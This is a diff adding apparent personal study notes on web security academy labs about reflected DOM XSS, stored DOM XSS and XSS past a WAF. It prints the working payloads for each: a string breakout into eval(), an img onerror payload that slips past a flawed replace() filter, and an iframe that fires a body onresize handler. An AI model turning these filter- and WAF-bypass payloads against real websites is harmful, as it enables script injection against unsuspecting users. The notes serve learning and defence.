@@ -590,3 +590,197 @@ XSS payloads depend on the execution context.
 When input appears inside an AngularJS-controlled area, attackers may be able to use AngularJS expressions instead of HTML tags.
 
 Encoding `<` and `>` is not enough if user input can still be evaluated as an AngularJS expression.
+
+
+### Lab 12: Reflected DOM XSS
+
+This lab focused on reflected DOM XSS.
+
+In this vulnerability, the user input was first sent to the server through the search functionality.
+
+The server reflected the input inside a JSON response from:
+
+/search-results
+
+Then, JavaScript on the page processed that reflected response unsafely.
+
+The dangerous sink in this lab was:
+
+eval()
+
+The JavaScript file responsible for processing the response was:
+
+searchResults.js
+
+The payload used was:
+
+\"-alert(1)}//
+
+The URL-encoded version was:
+
+%5C%22-alert%281%29%7D%2F%2F
+
+The server response became similar to:
+
+{"searchTerm":"\\"-alert(1)}//", "results":[]}
+
+Because the page used eval() to process the response, the payload broke out of the string and executed:
+
+alert(1)
+#### Key Takeaway
+
+Reflected DOM XSS happens when the server reflects user input, and then client-side JavaScript processes that reflected data in an unsafe way.
+
+The main issue in this lab was:
+
+Server reflects input into JSON response
+Client-side JavaScript processes the response using eval()
+Payload breaks out of the JSON/JavaScript string
+JavaScript executes in the browser
+
+### Reflected XSS vs DOM XSS vs Reflected DOM XSS
+
+| Type | Where is the problem? |
+|---|---|
+| Reflected XSS | The server reflects user input directly inside the HTML response. |
+| DOM XSS | JavaScript reads user input from the URL or page and writes it into the DOM unsafely. |
+| Reflected DOM XSS | The server reflects user input in a response, then client-side JavaScript processes it unsafely. |
+
+#### Main Lesson
+
+Not every XSS vulnerability appears directly in the HTML page.
+
+Sometimes the input appears inside a JSON response first, and the real danger happens later when JavaScript processes that response unsafely.
+
+### Lab 13: Stored DOM XSS
+
+This lab focused on stored DOM XSS in the blog comment functionality.
+
+The payload was stored as a blog comment and later processed by client-side JavaScript.
+
+The application attempted to prevent XSS by encoding angle brackets, but it used JavaScript `replace()` incorrectly.
+
+When `replace()` is used with a normal string argument, it only replaces the first occurrence.
+
+For example:
+
+```javascript
+text.replace("<", "&lt;")
+```
+
+This only replaces the first `<`.
+
+The successful payload was:
+
+```html
+<><img src=1 onerror=alert(1)>
+```
+
+The first extra angle brackets were encoded by the weak filter:
+
+```html
+<>
+```
+
+But the real payload remained active:
+
+```html
+<img src=1 onerror=alert(1)>
+```
+
+When the image failed to load, the `onerror` event executed:
+
+```javascript
+alert(1)
+```
+
+#### Key Takeaway
+
+Weak filtering can be bypassed if it only replaces the first dangerous character.
+
+Stored DOM XSS happens when stored user input is later handled unsafely by client-side JavaScript and written into the DOM.
+
+Simple string replacement is not a safe defense against XSS.
+
+### Stored XSS vs Stored DOM XSS
+
+| Type           | Simple Meaning                                                                              |
+| -------------- | ------------------------------------------------------------------------------------------- |
+| Stored XSS     | Payload is saved and later returned directly in the HTML response.                          |
+| Stored DOM XSS | Payload is saved, then client-side JavaScript reads it and writes it into the DOM unsafely. |
+
+#### Main Difference
+
+In Stored XSS, the server returns the malicious payload directly inside the HTML page.
+
+In Stored DOM XSS, the payload is stored first, but the dangerous execution happens later when JavaScript reads that stored data and writes it into the DOM in an unsafe way.
+
+### Lab 14: Reflected XSS into HTML Context with Most Tags and Attributes Blocked
+
+This lab focused on reflected XSS with WAF filtering.
+
+The application reflected the search input into the HTML response, but most common XSS tags and attributes were blocked.
+
+A standard payload such as:
+
+```html
+<img src=1 onerror=print()>
+```
+
+was blocked.
+
+Using Burp Intruder, I tested which HTML tags were allowed by the WAF.
+
+The allowed tag was:
+
+```html
+<body>
+```
+
+Then I tested event attributes and found that the allowed event was:
+
+```html
+onresize
+```
+
+The final reflected payload was:
+
+```html
+"><body onresize=print()>
+```
+
+The URL-encoded version was:
+
+```text
+%22%3E%3Cbody%20onresize=print()%3E
+```
+
+Because the lab required no user interaction, the exploit was delivered using an iframe:
+
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+
+The iframe loaded the vulnerable page.
+
+Then the iframe changed its width automatically using:
+
+```html
+onload=this.style.width='100px'
+```
+
+This triggered the `onresize` event and executed:
+
+```javascript
+print()
+```
+
+#### Key Takeaway
+
+WAFs may block common XSS payloads, but they are not a complete defense.
+
+If one tag or attribute is blocked, testing can reveal another allowed tag or event handler.
+
+In this lab, the bypass worked because the `body` tag and `onresize` event were allowed.
+
+The iframe made the exploit automatic, so the victim did not need to interact with the page.
